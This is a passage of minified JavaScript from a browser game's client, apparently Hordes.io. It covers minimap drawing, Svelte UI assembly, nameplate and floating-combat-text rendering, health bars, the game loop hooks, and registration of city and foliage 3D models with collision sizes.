                    t.stats && t.stats.alive && HC(t.Za[0], t.Za[2], t.type, Ua.player.hostility(t), t.party > 0 && t.party === Ua.player.party, t === Ua.player)
                }
                ),
                Ua.party.forEach(t => {
                    t.Za && !Ua.entity(t.id) && HC(t.Za[0], t.Za[1], 0, 0, Ua.player.party, !1)
                }
                ))
    }
        , HC = (t, e, s, i, n, a) => {
            if (!ji.mapShowMonsters && 1 === s)
                return;
            const r = GC(t, e);
            if (!(r[0] < 1 || r[1] < 1 || r[0] >= ZC.width || r[1] >= ZC.height))
                if (0 === s) {
                    if (zC && n && Ua.smoothtime % 1 > .5)
                        return;
                    UC.fillStyle = 0 === i ? a ? NC.player : n ? NC.party : NC.friendly : NC.pvp,
                        UC.fillRect(...r, 5, 5)
                } else
                    UC.fillStyle = i > 0 ? NC.monster : NC.friendly,
                        UC.fillRect(...r, 3, 3)
        }
        ;
    let KC = 0
        , WC = 0
        , YC = 0
        , VC = 0;
    const GC = (t, e) => [Math.round(t / Ua.bounds * (zC ? ZC.width : LC.width) - KC), Math.round(e / Ua.bounds * (zC ? ZC.height : LC.height) - WC)]
        , QC = t => {
            LC.src = Sp(t.id),
                FC = !1
        }
        , JC = t => {
            FC = !1
        }
        ;
    var tT = Object.freeze({
        __proto__: null,
        canvas: ZC,
        init: OC,
        changeCanvas: jC,
        postTick: XC,
        onWorldEnter: QC,
        onWorldDestroy: JC
    });
    function eT(t) {
        let e;
        return {
            c() {
                e = T("div"),
                    B(e, "class", "marg-top container panel-black svelte-hiyby7")
            },
            m(s, i) {
                M(s, e, i),
                    t[1](e)
            },
            p: i,
            i: i,
            o: i,
            d(s) {
                s && _(e),
                    t[1](null)
            }
        }
    }
    function sT(t, e, s) {
        let i;
        function n(t) {
            at[t ? "unshift" : "push"](() => {
                s(0, i = t)
            }
            )
        }
        return J(() => {
            i.appendChild(ZC),
                jC(!1)
        }
        ),
            [i, n]
    }
    class iT extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, sT, eT, h, {})
        }
    }
    function nT(t) {
        let e;
        const s = new kC({});
        return {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function aT(t) {
        let e;
        const s = new CC({
            props: {
                vertical: !0
            }
        });
        return {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function rT(t) {
        let e, s, i, n, a, r, o, l;
        const c = new _$({})
            , h = new Gm({});
        let d = t[0] && !t[0].subscribed_until && (t[1] || t[2] || t[3] || t[4] || t[5]) && nT();
        const u = new FM({})
            , m = new ap({})
            , p = new B$({})
            , f = new Kb({})
            , g = new _M({})
            , v = new bb({})
            , y = new l$({})
            , b = new k$({})
            , w = new U$({})
            , x = new gS({})
            , k = new bM({})
            , $ = new CS({})
            , S = new jS({})
            , C = new nE({})
            , P = new fE({})
            , I = new XE({})
            , A = new D_({})
            , R = new bC({})
            , z = new X$({})
            , F = new iT({})
            , Z = new DC({})
            , U = new W$({});
        let L = t[6] && aT();
        const N = new tx({})
            , O = new Vk({})
            , j = new z_({})
            , q = new IM({});
        return {
            c() {
                Ft(c.$$.fragment),
                    e = T("div"),
                    Ft(h.$$.fragment),
                    s = T("div"),
                    d && d.c(),
                    i = D(),
                    Ft(u.$$.fragment),
                    Ft(m.$$.fragment),
                    Ft(p.$$.fragment),
                    Ft(f.$$.fragment),
                    Ft(g.$$.fragment),
                    Ft(v.$$.fragment),
                    Ft(y.$$.fragment),
                    Ft(b.$$.fragment),
                    Ft(w.$$.fragment),
                    Ft(x.$$.fragment),
                    Ft(k.$$.fragment),
                    Ft($.$$.fragment),
                    Ft(S.$$.fragment),
                    Ft(C.$$.fragment),
                    Ft(P.$$.fragment),
                    Ft(I.$$.fragment),
                    Ft(A.$$.fragment),
                    Ft(R.$$.fragment),
                    n = T("div"),
                    Ft(z.$$.fragment),
                    Ft(F.$$.fragment),
                    Ft(Z.$$.fragment),
                    Ft(U.$$.fragment),
                    L && L.c(),
                    a = T("div"),
                    r = T("div"),
                    o = T("div"),
                    Ft(N.$$.fragment),
                    Ft(O.$$.fragment),
                    Ft(j.$$.fragment),
                    Ft(q.$$.fragment),
                    B(n, "class", "l-corner-ur uiscaled"),
                    B(s, "class", "container svelte-1j9lddf"),
                    B(o, "class", "actionbarcontainer svelte-1j9lddf"),
                    B(r, "class", "uiscaled"),
                    B(a, "class", "container svelte-1j9lddf"),
                    B(e, "class", "l-ui layout svelte-1j9lddf")
            },
            m(t, _) {
                Zt(c, t, _),
                    M(t, e, _),
                    Zt(h, e, null),
                    E(e, s),
                    d && d.m(s, null),
                    E(s, i),
                    Zt(u, s, null),
                    Zt(m, s, null),
                    Zt(p, s, null),
                    Zt(f, s, null),
                    Zt(g, s, null),
                    Zt(v, s, null),
                    Zt(y, s, null),
                    Zt(b, s, null),
                    Zt(w, s, null),
                    Zt(x, s, null),
                    Zt(k, s, null),
                    Zt($, s, null),
                    Zt(S, s, null),
                    Zt(C, s, null),
                    Zt(P, s, null),
                    Zt(I, s, null),
                    Zt(A, s, null),
                    Zt(R, s, null),
                    E(s, n),
                    Zt(z, n, null),
                    Zt(F, n, null),
                    Zt(Z, n, null),
                    Zt(U, n, null),
                    L && L.m(n, null),
                    E(e, a),
                    E(a, r),
                    E(r, o),
                    Zt(N, o, null),
                    Zt(O, o, null),
                    Zt(j, a, null),
                    Zt(q, e, null),
                    l = !0
            },
            p(t, [e]) {
                t[0] && !t[0].subscribed_until && (t[1] || t[2] || t[3] || t[4] || t[5]) ? d ? 63 & e && Et(d, 1) : (d = nT(),
                    d.c(),
                    Et(d, 1),
                    d.m(s, i)) : d && ($t(),
                        Mt(d, 1, 1, () => {
                            d = null
                        }
                        ),
                        St()),
                    t[6] ? L ? 64 & e && Et(L, 1) : (L = aT(),
                        L.c(),
                        Et(L, 1),
                        L.m(n, null)) : L && ($t(),
                            Mt(L, 1, 1, () => {
                                L = null
                            }
                            ),
                            St())
            },
            i(t) {
                l || (Et(c.$$.fragment, t),
                    Et(h.$$.fragment, t),
                    Et(d),
                    Et(u.$$.fragment, t),
                    Et(m.$$.fragment, t),
                    Et(p.$$.fragment, t),
                    Et(f.$$.fragment, t),
                    Et(g.$$.fragment, t),
                    Et(v.$$.fragment, t),
                    Et(y.$$.fragment, t),
                    Et(b.$$.fragment, t),
                    Et(w.$$.fragment, t),
                    Et(x.$$.fragment, t),
                    Et(k.$$.fragment, t),
                    Et($.$$.fragment, t),
                    Et(S.$$.fragment, t),
                    Et(C.$$.fragment, t),
                    Et(P.$$.fragment, t),
                    Et(I.$$.fragment, t),
                    Et(A.$$.fragment, t),
                    Et(R.$$.fragment, t),
                    Et(z.$$.fragment, t),
                    Et(F.$$.fragment, t),
                    Et(Z.$$.fragment, t),
                    Et(U.$$.fragment, t),
                    Et(L),
                    Et(N.$$.fragment, t),
                    Et(O.$$.fragment, t),
                    Et(j.$$.fragment, t),
                    Et(q.$$.fragment, t),
                    l = !0)
            },
            o(t) {
                Mt(c.$$.fragment, t),
                    Mt(h.$$.fragment, t),
                    Mt(d),
                    Mt(u.$$.fragment, t),
                    Mt(m.$$.fragment, t),
                    Mt(p.$$.fragment, t),
                    Mt(f.$$.fragment, t),
                    Mt(g.$$.fragment, t),
                    Mt(v.$$.fragment, t),
                    Mt(y.$$.fragment, t),
                    Mt(b.$$.fragment, t),
                    Mt(w.$$.fragment, t),
                    Mt(x.$$.fragment, t),
                    Mt(k.$$.fragment, t),
                    Mt($.$$.fragment, t),
                    Mt(S.$$.fragment, t),
                    Mt(C.$$.fragment, t),
                    Mt(P.$$.fragment, t),
                    Mt(I.$$.fragment, t),
                    Mt(A.$$.fragment, t),
                    Mt(R.$$.fragment, t),
                    Mt(z.$$.fragment, t),
                    Mt(F.$$.fragment, t),
                    Mt(Z.$$.fragment, t),
                    Mt(U.$$.fragment, t),
                    Mt(L),
                    Mt(N.$$.fragment, t),
                    Mt(O.$$.fragment, t),
                    Mt(j.$$.fragment, t),
                    Mt(q.$$.fragment, t),
                    l = !1
            },
            d(t) {
                Ut(c, t),
                    t && _(e),
                    Ut(h),
                    d && d.d(),
                    Ut(u),
                    Ut(m),
                    Ut(p),
                    Ut(f),
                    Ut(g),
                    Ut(v),
                    Ut(y),
                    Ut(b),
                    Ut(w),
                    Ut(x),
                    Ut(k),
                    Ut($),
                    Ut(S),
                    Ut(C),
                    Ut(P),
                    Ut(I),
                    Ut(A),
                    Ut(R),
                    Ut(z),
                    Ut(F),
                    Ut(Z),
                    Ut(U),
                    L && L.d(),
                    Ut(N),
                    Ut(O),
                    Ut(j),
                    Ut(q)
            }
        }
    }
    function oT(t, e, s) {
        let i, n, a, r, o, l, c;
        return m(t, Ze, t => s(0, i = t)),
            m(t, Ce, t => s(1, n = t)),
            m(t, Se, t => s(2, a = t)),
            m(t, De, t => s(3, r = t)),
            m(t, Ie, t => s(4, o = t)),
            m(t, Te, t => s(5, l = t)),
            m(t, ds, t => s(6, c = t)),
            Z_(t => {
                t && t.subscribed_until && HS("sub", "Hordes Elixir active $gt", !0)
            }
            ),
            [i, n, a, r, o, l, c]
    }
    class lT extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, oT, rT, h, {})
        }
    }
    function cT(t) {
        let e;
        const s = new lT({});
        return {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function hT(t) {
        let e, s;
        const i = new qm({
            props: {
                active: t[0]
            }
        });
        let n = "play" == t[1] && t[2] && !t[0] && t[3] && cT();
        const a = new Km({});
        return {
            c() {
                Ft(i.$$.fragment),
                    n && n.c(),
                    e = D(),
                    Ft(a.$$.fragment)
            },
            m(t, r) {
                Zt(i, t, r),
                    n && n.m(t, r),
                    M(t, e, r),
                    Zt(a, t, r),
                    s = !0
            },
            p(t, [s]) {
                const a = {};
                1 & s && (a.active = t[0]),
                    i.$set(a),
                    "play" == t[1] && t[2] && !t[0] && t[3] ? n ? 15 & s && Et(n, 1) : (n = cT(),
                        n.c(),
                        Et(n, 1),
                        n.m(e.parentNode, e)) : n && ($t(),
                            Mt(n, 1, 1, () => {
                                n = null
                            }
                            ),
                            St())
            },
            i(t) {
                s || (Et(i.$$.fragment, t),
                    Et(n),
                    Et(a.$$.fragment, t),
                    s = !0)
            },
            o(t) {
                Mt(i.$$.fragment, t),
                    Mt(n),
                    Mt(a.$$.fragment, t),
                    s = !1
            },
            d(t) {
                Ut(i, t),
                    n && n.d(t),
                    t && _(e),
                    Ut(a, t)
            }
        }
    }
    function dT(t, e, s) {
        let i, n, a, r;
        return m(t, ee, t => s(0, i = t)),
            m(t, se, t => s(1, n = t)),
            m(t, Qt, t => s(2, a = t)),
            m(t, we, t => s(3, r = t)),
            [i, n, a, r]
    }
    class uT extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, dT, hT, h, {})
        }
    }
    let mT;
    const pT = () => {
        mT = Fa.canvas2dContext,
            mT.font = "bold 18px hordes",
            mT.fillText("Hordes", 0, 0)
    }
        , fT = (t, e, s = 1, i = 1, n = 1, a = 1, r = 0, o = 0, l = .5, c = .5) => {
            mT.globalAlpha = ji.nameplateShowTransparency ? s : 1;
            const h = t.width * i
                , d = t.height * i
                , u = Math.round(h * n)
                , m = Math.round(d * a);
            return 0 === u || 0 === m || mT.drawImage(t, 0, 0, Math.round(t.width * n), Math.round(t.height * a), Math.round(e[0] - h * l + r * i), Math.round(e[1] - d * c + o * i), u, m),
                u
        }
        , gT = (t, e, s, i, n, a = 0, r = 0, o = .5, l = .5) => fT(xT(e, s), t, i, n, 1, 1, a, r, o, l)
        , vT = (t, e, s = !1) => (s ? (e[0] = t[0],
            e[1] = t[1]) : hn(e, t, Ba.kX),
            !!(s || e[2] < 1 && e[0] > -1 && e[0] < 1 && e[1] > -1 && e[1] < 1) && (e[0] = Math.round((.5 * e[0] + .5) * Fa.canvas2dElement.width),
                e[1] = Math.round((-.5 * e[1] + .5) * Fa.canvas2dElement.height),
                e))
        , yT = (t, e, s) => {
            t.font = "bold " + e + "px hordes",
                t.shadowColor = "#000",
                t.shadowOffsetX = 1,
                t.shadowOffsetY = 1,
                t.fillStyle = s
        }
        , bT = {
            name: {
                fill: RC("name"),
                size: 17
            },
            enemy: {
                fill: RC("enemy"),
                size: 17
            },
            pvp: {
                fill: RC("pvp"),
                size: 17
            },
            nameSmall: {
                fill: RC("name"),
                size: 13
            },
            enemySmall: {
                fill: RC("enemy"),
                size: 13
            },
            pvpSmall: {
                fill: RC("pvp"),
                size: 13
            },
            chatGlobal: {
                fill: RC("global"),
                size: 13,
                wrap: 150
            },
            chatClan: {
                fill: RC("clan"),
                size: 13,
                wrap: 150
            },
            chatParty: {
                fill: RC("party"),
                size: 13,
                wrap: 150
            },
            lev0: {
                fill: "#919191",
                size: 13
            },
            lev1: {
                fill: RC("name"),
                size: 13
            },
            lev2: {
                fill: "#EEA303",
                size: 13
            },
            lev3: {
                fill: RC("enemy"),
                size: 13
            },
            clan: {
                fill: RC("clan"),
                size: 17
            },
            faction0: {
                fill: RC("f0"),
                size: 17
            },
            faction1: {
                fill: RC("f1"),
                size: 17
            },
            faction0small: {
                fill: RC("f0"),
                size: 13
            },
            faction1small: {
                fill: RC("f1"),
                size: 13
            },
            phys: {
                fill: RC("name"),
                size: 28
            },
            spell: {
                fill: RC("spell"),
                size: 35
            },
            heal: {
                fill: RC("health"),
                size: 28
            },
            mana: {
                fill: RC("mana"),
                size: 22
            },
            exp: {
                fill: RC("exp"),
                size: 28
            },
            fame: {
                fill: RC("fame"),
                size: 28
            },
            gold: {
                fill: "#EEDDA3",
                size: 16
            },
            misc: {
                fill: "#A6EBFA",
                size: 16
            },
            book: {
                fill: "#749DEF",
                size: 20
            },
            rune: {
                fill: "#DC9A4D",
                size: 20
            },
            itemgrey: {
                fill: "#747474",
                size: 16
            },
            common: {
                fill: "#dddddd",
                size: 20
            },
            uncommon: {
                fill: RC("green"),
                size: 20
            },
            rare: {
                fill: RC("blue"),
                size: 20
            },
            epic: {
                fill: RC("purp"),
                size: 20
            },
            pheal: {
                fill: RC("health"),
                size: 22
            },
            pdmg: {
                fill: RC("enemy"),
                size: 22
            }
        }
        , wT = {}
        , xT = (t, { fill: e, size: s, wrap: i = 0 }) => {
            const n = t + e + s;
            if (wT[n])
                return wT[n];
            const a = document.createElement("canvas")
                , r = a.getContext("2d");
            return r.font = "bold " + s + "px hordes",
                i > 0 ? $T(a, r, t, 0, 0, i, s, e) : (a.width = Math.max(1, Math.ceil(r.measureText(t).width)) + 5,
                    a.height = Math.ceil(1.2 * s + 5),
                    yT(r, s, e),
                    r.fillText(t, 0, a.height - 6)),
                wT[n] = a,
                a
        }
        , kT = (t, e, s, i, n, a, r) => {
            t || ((t = document.createElement("canvas")).width = s,
                t.height = i);
            const o = t.getContext("2d");
            return o.fillStyle = e,
                o.beginPath(),
                o.moveTo(n + r, a),
                o.arcTo(n + s, a, n + s, a + i, r),
                o.arcTo(n + s, a + i, n, a + i, r),
                o.arcTo(n, a + i, n, a, r),
                o.arcTo(n, a, n + s, a, r),
                o.closePath(),
                o.fill(),
                t
        }
        , $T = (t, e, s, i, n, a, r, o) => {
            const l = s.split(" ")
                , c = [];
            let h = 0
                , d = "";
            for (let t = 0; t < l.length; ++t) {
                const s = d + l[t] + " "
                    , i = e.measureText(s);
                i.width > a ? (c.push(d),
                    d = l[t] + " ") : (h = Math.max(h, i.width),
                        d = s)
            }
            c.push(d),
                t.width = Math.ceil(h + 5),
                t.height = Math.ceil(c.length * r + 10),
                kT(t, "#00000099", t.width, t.height, 0, 0, 5),
                yT(e, r, o);
            for (let t = 0; t < c.length; ++t)
                e.fillText(c[t], i + 5, (t + 1) * r + 3)
        }
        , ST = []
        , ET = t => {
            for (let e = 0; e < ST.length; e++) {
                const s = ST[e];
                if (s.time += t,
                    s.time > 2)
                    ST.splice(e--, 1);
                else if (s.time > 0) {
                    s.float && (s.Za[1] += s.flat ? .15 * t : t);
                    const e = vT(s.Za, Oa, s.flat);
                    e && gT(e, s.text, s.style, Math.min(1, 6 - s.time * (s.crit ? 2 : 3)), s.crit ? 1.8 + 6 * Math.max(0, .5 - 3 * s.time) : 1)
                }
            }
        }
        , MT = (t, e, s, i, n = !1) => {
            IT(t, n, 3 === s, n || 3 !== s, 0 === s ? "Miss" : e + (1 === s ? "" : ""), n ? bT.pdmg : 1 === i ? bT.spell : bT.phys, 3.5, -.3)
        }
        , _T = (t, e, s, i = !1) => {
            IT(t, i, 3 === s, i || 3 !== s, e, i ? bT.pheal : bT.heal, 3, 0)
        }
        , CT = (t, e, s, i = !1) => {
            IT(t, i, 3 === s, i || 3 !== s, e, bT.mana, 2, 0)
        }
        , TT = (t, e) => {
            IT(t, !1, !1, !0, `+${e} EXP`, bT.exp, 4, 0)
        }
        , PT = (t, e) => {
            IT(t, !1, !1, !0, `+${e} Fame`, bT.fame, 5.5, 0)
        }
        , IT = (t, e = !1, s = !1, i = !1, n, a, r, o) => {
            e || (t[1] += r,
                t[0] += Yo(-.5, .5),
                t[2] += Yo(-.5, .5)),
                ST.push({
                    Za: t,
                    flat: e,
                    crit: s,
                    float: i,
                    text: n,
                    style: a,
                    time: o
                })
        }
        , DT = new Set
        , AT = (t, e, s) => {
            for (let i = s.length - 1; i >= 0; i--) {
                const n = s[i];
                (n == e || an(e.Za, n.Za) < 25) && (t.push(n),
                    Qi(t.Za, t.Za, n.Za),
                    s.splice(i, 1))
            }
        }
        , BT = (t, e) => {
            Yi(t.hudPos, t.visualPosition || t.Za),
                vT(t.hudPos, t.hudPos) && t.hudPos[2] < .997 && e.push(t)
        }
        , RT = t => {
            let e = [];
            Ua.entities.array.forEach(t => {
                !t.transform.visible || 3 !== t.type || t.quality < ji.itemQualityFilter || BT(t, e)
            }
            ),
                DT.forEach(t => {
                    t.uiTimeout < Ua.time ? DT.delete(t) : BT(t, e)
                }
                ),
                e = e.sort((t, e) => e.id - t.id);
            const s = new Set;
            for (; e.length;) {
                const t = e[0]
                    , i = [];
                i.Za = [0, 0, 0],
                    AT(i, t, e),
                    en(i.Za, i.Za, 1 / i.length),
                    Vi(i.Za, Math.round(i.Za[0]), Math.round(i.Za[1]), Math.round(i.Za[2])),
                    vT(i.Za, i.Za) ? s.add(i.sort((t, e) => t.hudPos[2] - e.hudPos[2])) : s.delete(i)
            }
            let i = 0;
            Array.from(s).sort((t, e) => e.Za[2] - t.Za[2]).forEach(t => {
                const e = t.length / 5 * 100;
                let s = 0
                    , n = 0;
                t.forEach((a, r) => {
                    a.hudTextImg || (a.hudTextImg = xT(a.name, bT[a.color]));
                    const o = a.hudTextImg.width
                        , l = Math.round(t.Za[0] + n - .5 * e) - 2
                        , c = Math.round(t.Za[1] - 20 * s) - 8;
                    if (0 === a.uiTimeout) {
                        const t = a.canBePickedUpBy(Ua.player)
                            , e = a.partyTimeoutCheck(Ua.player);
                        t && !(xl[0] > l + o || xl[1] > c + 20 || xl[0] < l || xl[1] < c) ? (i = a.id,
                            mT.globalAlpha = 1) : mT.globalAlpha = t ? .4 : .1,
                            mT.fillStyle = "#000000",
                            mT.beginPath(),
                            mT.rect(l, c, o, 20),
                            mT.fill(),
                            gT(ba(Ya, l + 2, c + 8), a.name, e ? bT[a.color] : bT.itemgrey, t ? 1 : .8, 1, 0, 0, 0)
                    }
                    n += o + 3,
                        n > e && (s++,
                            n = 0)
                }
                )
            }
            ),
                i !== hw && vw(i)
        }
        , zT = [];
    let FT, ZT;
    const UT = 2
        , LT = () => {
            const t = (10 + 3) / 13
                , e = Math.ceil(100 * t)
                , s = Math.max(7, Math.ceil(9 * t))
                , i = Math.max(1, Math.ceil(UT * t))
                , n = e - 2 * UT
                , a = s - 2 * UT;
            zT.push(kT(null, RC("panel"), e, s, 0, 0, i)),
                kT(zT[0], RC("grey"), n, a, UT, UT, 1),
                zT.push(kT(null, RC("health"), n, a, 0, 0, 1)),
                zT.push(kT(null, RC("enemy"), n, a, 0, 0, 1)),
                zT.push(kT(null, RC("party"), n, a, 0, 0, 1)),
                zT.push(kT(null, RC("pvp"), n, a, 0, 0, 1)),
                zT.push(kT(null, "#555555", n, a, 0, 0, 1)),
                zT.push(kT(null, RC("spell"), n, a, 0, 0, 1));
            for (let t = 0; t <= 3; ++t)
                zT.push(kT(null, RC("c" + t), n, a, 0, 0, 1));
            FT = kT(null, "#ffffff", 100 + 2 * UT, 9 + 2 * UT, 0, 0, 3),
                ZT = kT(null, "#ffffff", 100 + 2 * UT, 16 + 2 * UT, 0, 0, 3)
        }
        , NT = () => {
            const t = [];
            return Ua.entities.array.forEach((e, s) => {
                e.stats && !e.stats.alive || !e.transform.visible || e.id !== Ua.player.target && e.transform.cDist && e.transform.cDist > 60 || 3 === e.type && e.id !== hw || (Yi(e.hudPos, e.visualPosition || e.Za),
                    e.hudPos[1] += .7 + (e.transform.getTopAbsolute ? e.transform.getTopAbsolute() : 0),
                    vT(e.hudPos, e.hudPos) && (e === Ua.player && (e.hudPos[0] = Math.round(.5 * Fa.canvas2dElement.width),
                        e.hudPos[1] = Math.round(.5 * Fa.canvas2dElement.height)),
                        t.push(e)))
            }
            ),
                t.sort((t, e) => e.hudPos[2] - t.hudPos[2])
        }
        , OT = (t, e) => {
            let s = t.transform && t.transform.cDist;
            if (s > ji.nameplateViewRange)
                return;
            s ? s /= 70 : s = 0;
            const i = t.party > 0 && t.party === Ua.player.party
                , n = t.id === Ua.player.target
                , a = void 0 !== t.faction ? Ua.player.hostility(t) : 0
                , r = t.id === hw;
            if (3 !== t.type && t.stats && t.stats.alive) {
                if (!ji.nameplateShowMonsers && 1 === t.type)
                    return;
                t.namePlateScale = nr(t.namePlateScale + .25 * ((n ? 1 : 0) - t.namePlateScale), .5, 1);
                const e = n ? 1 : .7 * Math.max(.1, Math.min(1, 1 - s))
                    , o = n || i ? 1 : Math.min(.8, r ? .9 : .75 * e + .2)
                    , l = void 0 !== t.skills.timedSkill;
                if (t !== Ua.player && n && fT(l ? ZT : FT, t.hudPos, 1, t.namePlateScale, 1, l ? 2 : 1, 0, l ? 4 : 0),
                    l) {
                    const e = zT[0].height - UT
                        , s = nr(t.skills.timedCast.fraction(Ua.smoothtime), 0, 1);
                    fT(zT[0], t.hudPos, o, t.namePlateScale, 1, 1, 0, e),
                        s > 0 && fT(zT[6], t.hudPos, o, t.namePlateScale, s, 1, 0, e)
                }
                if (t !== Ua.player && (ji.showFriendlyBars || n || a > 0) && (fT(zT[0], t.hudPos, o, t.namePlateScale, 1, l ? 2 : 1),
                    fT(i ? zT[3] : 0 === a ? zT[ji.classColorBars && 0 === t.type ? 7 + t.class : 1] : a > 1 ? t.canCombatInteract(Ua.player) ? zT[ji.classColorBars ? 7 + t.class : 4] : zT[5] : zT[2], t.hudPos, o, t.namePlateScale, t.stats.getResource(6) / t.stats.getStat(6), 1),
                    t.clan && gT(ba(Ya, t.hudPos[0] - (zT[0].width / 2 + UT) * t.namePlateScale, t.hudPos[1]), t.clan, t.clan == Ua.player.clan ? bT.clan : 0 === t.faction ? bT.faction0small : bT.faction1small, o, 1, 2, 0, 1),
                    t.level && (ji.alwaysShowLevel || n))) {
                    let e = bT.lev1;
                    a > 0 && (t.level - Ua.player.level > 4 ? e = bT.lev3 : t.level - Ua.player.level > 1 ? e = bT.lev2 : t.level - Ua.player.level < -5 && (e = bT.lev0)),
                        gT(ba(Ya, t.hudPos[0] + (zT[0].width / 2 + UT) * t.namePlateScale, t.hudPos[1]), t.level, e, o, 1, 0, 0, 0)
                }
            }
            if (t === Ua.player || n || t.faction < 2 || r) {
                const e = 3 === t.type && r && !t.canBePickedUpBy(Ua.player) ? .5 : n || 3 === t.type ? 1 : r ? .9 : .7 * Math.max(.1, Math.min(1, 1 - s));
                let i;
                3 === t.type ? i = t.partyTimeoutCheck(Ua.player) ? bT[t.color] : bT.itemgrey : 0 === a ? i = n ? bT.name : bT.nameSmall : 1 === a ? i = n ? bT.enemy : bT.enemySmall : 2 === a && (i = n ? bT.pvp : bT.pvpSmall);
                const o = n ? -16 : -9
                    , l = t == Ua.player && t.clan ? 5 * t.clan.length : 0
                    , c = gT(t.hudPos, t.name, i, e, 1, l, o);
                t.clan && t == Ua.player && gT(ba(Ya, t.hudPos[0] - c / 2 + UT, t.hudPos[1]), t.clan, 0 === t.faction ? n ? bT.faction0 : bT.faction0small : n ? bT.faction1 : bT.faction1small, e, 1, 5 * t.clan.length, o, 1)
            }
            t.speechText && gT(t.hudPos, t.speechText, t.speechStyle, 1, 1, 0, n ? -30 : -20, .5, 1)
        }
        , jT = t => {
            DT.clear();
            let e = NT();
            Ew(e),
                e = e.sort((t, e) => t.id === Ua.player.target || t.id === hw ? 1 : e.id === Ua.player.target || e.id === hw ? -1 : e.hudPos[2] - t.hudPos[2]),
                Xn(Wa, 0, 0, 0, 0),
                e.forEach(OT)
        }
        , qT = () => {
            pT(),
                LT()
        }
        , XT = t => {
            Fa.canvas2dContext.clearRect(0, 0, Fa.canvas2dElement.width, Fa.canvas2dElement.height),
                $l.shift.down ? RT() : jT(),
                ET(t)
        }
        ;
    const HT = [Object.freeze({
        __proto__: null,
        init: qT,
        postTick: XT
    }), _w, f$, tT, nb, Sm, ew];
    new uT({
        target: document.querySelector("body")
    });
    let KT = !1;
    const WT = () => {
        HT.forEach(t => {
            t.init && t.init()
        }
        )
    }
        , YT = t => {
            HT.forEach(e => {
                e.preTick && e.preTick(t)
            }
            )
        }
        , VT = t => {
            KT && HT.forEach(e => {
                e.tick && e.tick(t)
            }
            )
        }
        , GT = t => {
            KT && HT.forEach(e => {
                e.postTick && e.postTick(t)
            }
            )
        }
        , QT = t => {
            HT.forEach(e => {
                e.onWorldEnter && e.onWorldEnter(t)
            }
            ),
                KT = !0
        }
        , JT = t => {
            KT && HT.forEach(e => {
                e.onWorldDestroy && e.onWorldDestroy(t)
            }
            ),
                KT = !1
        }
        , tP = {}
        , eP = t => {
            let e = 0;
            for (let s = 0, i = t.length; s < i; s++)
                e = Math.imul(31, e) + t.charCodeAt(s);
            return 2147483647 & e
        }
        ;
    let sP;
    const iP = t => {
        sP = t
    }
        ;
    let nP;
    const aP = t => {
        nP = t
    }
        , rP = (t, e, s) => {
            (e = e || {}).invisible = e.invisible || !1,
                e.receiveShadow = void 0 === e.receiveShadow || e.receiveShadow,
                e.throwShadow = void 0 === e.throwShadow || e.throwShadow;
            const i = e.id || eP(t);
            tP[i] = {
                name: t,
                geometry: nP + "/" + (s || t + ".ho"),
                texture: sP,
                meta: e
            }
        }
        ;
    iP("atlas1"),
        aP("city_vg"),
        rP("city_vg_column", {
            coll: [Gg, 3.59, 8.08, 3.59]
        }),
        rP("city_vg_gate01"),
        rP("city_vg_house01", {
            coll: [Gg, 12, 15.6, 10.8]
        }),
        rP("city_vg_house_stone_red_roof", {
            coll: [Gg, 12, 15.6, 10.8]
        }),
        rP("city_vg_house_small", {
            coll: [Gg, 12.2, 12.2, 10.7]
        }),
        rP("city_vg_house_barn_small", {
            coll: [Gg, 12.2, 12.2, 10.7]
        }),
        rP("city_vg_house_extra_overhang_01", {
            coll: [Gg, 3.5, 5, 3.5]
        }),
        rP("city_vg_house_tower_01"),
        rP("city_vg_house_extra_connection_01", {
            coll: [Gg, 8.5, 5, 3.5]
        }),
        rP("city_vg_plaza_round"),
        rP("city_vg_plaza_square"),
        rP("city_vg_plaza_star"),
        rP("city_vg_tower01", {
            coll: [Gg, 9.34, 26.06, 9.34]
        }),
        rP("city_vg_tower02"),
        rP("city_vg_tower04", {
            coll: [Vg, 1.7, 6]
        }),
        rP("city_vg_tower_round_base01", {
            coll: [Vg, 4, 5]
        }),
        rP("city_vg_tower_round_top01", {
            coll: [Vg, 3, 2]
        }),
        rP("city_vg_wall01", {
            coll: [Gg, 13.2, 7.78, 2.45]
        }),
        rP("city_vg_wall_01_broken", {
            coll: [Gg, 2.2, 2.2, 1]
        }),
        rP("city_vg_door"),
        rP("city_vg_bridge_01", {
            coll: [Gg, 8, 3, 17]
        }),
        rP("vg_cart_01", {
            coll: [Gg, 11.5, 10.5, 6.5]
        }),
        aP("city_bloodlust"),
        rP("city_bloodlust_wall_01"),
        rP("city_bloodlust_building_main_house", {
            coll: [Vg, 14.5, 10]
        }),
        aP("city_vg/deco"),
        rP("city_vg_deco_bench_01", {
            coll: [Gg, 1, .05, .5]
        }),
        rP("city_vg_deco_bush_double_01", {
            coll: [Gg, 1, 1, 2]
        }),
        rP("city_vg_deco_fence_stone_01", {
            coll: [Gg, 2.5, 1.3, .4]
        }),
        rP("city_vg_deco_fountain_01", {
            coll: [Vg, 6.3, 9]
        }),
        rP("city_vg_deco_tree_medium_01", {
            coll: [Gg, .2, 1.5, .2]
        }),
        rP("city_vg_deco_well_square_roof_01", {
            coll: [Gg, 1, 1.5, 1]
        }),
        rP("city_vg_deco_lamp"),
        aP("foliage"),
        rP("foliage_fern_01"),
        rP("foliage_palm_tree_01", {
            coll: [Vg, .3, 5]
        }),
        aP("misc"),
        rP("misc_barrel_01", {
            coll: [Vg, .3, .6]
        }),
        rP("misc_crate_01", {
            coll: [Gg, .7, .7, .7]
        }),
